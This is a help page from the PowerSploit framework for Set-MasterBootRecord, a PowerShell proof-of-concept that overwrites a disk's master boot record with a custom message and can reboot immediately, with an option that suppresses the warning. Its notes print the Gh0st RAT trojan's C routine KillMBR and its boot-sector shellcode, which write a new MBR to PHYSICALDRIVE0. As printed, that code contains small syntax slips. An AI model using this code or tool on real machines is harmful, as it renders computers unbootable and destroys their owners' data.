# Set-MasterBootRecord

## SYNOPSIS
Proof of concept code that overwrites the master boot record with the
message of your choice.

PowerSploit Function: Set-MasterBootRecord  
Author: Matthew Graeber (@mattifestation) and Chris Campbell (@obscuresec)  
License: BSD 3-Clause  
Required Dependencies: None  
Optional Dependencies: None

## SYNTAX

```
Set-MasterBootRecord [[-BootMessage] <String>] [-RebootImmediately] [-Force] [-WhatIf] [-Confirm]
```

## DESCRIPTION
Set-MasterBootRecord is proof of concept code designed to show that it is
possible with PowerShell to overwrite the MBR.
This technique was taken
from a public malware sample.
This script is inteded solely as proof of
concept code.

## EXAMPLES

### -------------------------- EXAMPLE 1 --------------------------
```
Set-MasterBootRecord -BootMessage 'This is what happens when you fail to defend your network. #CCDC'
```

## PARAMETERS

### -BootMessage
Specifies the message that will be displayed upon making your computer a brick.

```yaml
Type: String
Parameter Sets: (All)
Aliases: 

Required: False
Position: 1
Default value: Stop-Crying; Get-NewHardDrive
Accept pipeline input: False
Accept wildcard characters: False
```

### -RebootImmediately
Reboot the machine immediately upon overwriting the MBR.

```yaml
Type: SwitchParameter
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: False
Accept pipeline input: False
Accept wildcard characters: False
```

### -Force
Suppress the warning prompt.

```yaml
Type: SwitchParameter
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: False
Accept pipeline input: False
Accept wildcard characters: False
```

### -WhatIf
Shows what would happen if the cmdlet runs.
The cmdlet is not run.

```yaml
Type: SwitchParameter
Parameter Sets: (All)
Aliases: wi

Required: False
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### -Confirm
Prompts you for confirmation before running the cmdlet.

```yaml
Type: SwitchParameter
Parameter Sets: (All)
Aliases: cf

Required: False
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

## INPUTS

## OUTPUTS

## NOTES
Obviously, this will only work if you have a master boot record to
overwrite.
This won't work if you have a GPT (GUID partition table).

This code was inspired by the Gh0st RAT source code seen here (acquired from: http://webcache.googleusercontent.com/search?q=cache:60uUuXfQF6oJ:read.pudn.com/downloads116/sourcecode/hack/trojan/494574/gh0st3.6_%25E6%25BA%2590%25E4%25BB%25A3%25E7%25A0%2581/gh0st/gh0st.cpp__.htm+&cd=3&hl=en&ct=clnk&gl=us):

// CGh0stApp message handlers

unsigned char scode\[\] =
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
"\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";

int CGh0stApp::KillMBR()
{
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR\[512\] = {0};

	// ????MBR
	memcpy(pMBR, scode, sizeof(scode) - 1);
	pMBR\[510\] = 0x55;
	pMBR\[511\] = 0xAA;

	hDevice = CreateFile
		(
		"\\\\\\\\.\\\\PHYSICALDRIVE0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
		);
	if (hDevice == INVALID_HANDLE_VALUE)
		return -1;
	DeviceIoControl
		(
		hDevice,
		FSCTL_LOCK_VOLUME,
		NULL,
		0,
		NULL,
		0,
		&dwBytesReturned,
		NUL
		)
	// ??????
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl
		(
		hDevice,
		FSCTL_UNLOCK_VOLUME,
		NULL,
		0,
		NULL,
		0,
		&dwBytesReturned,
		NULL
		);
	CloseHandle(hDevice);

	ExitProcess(-1);
	return 0;
}

## RELATED LINKS

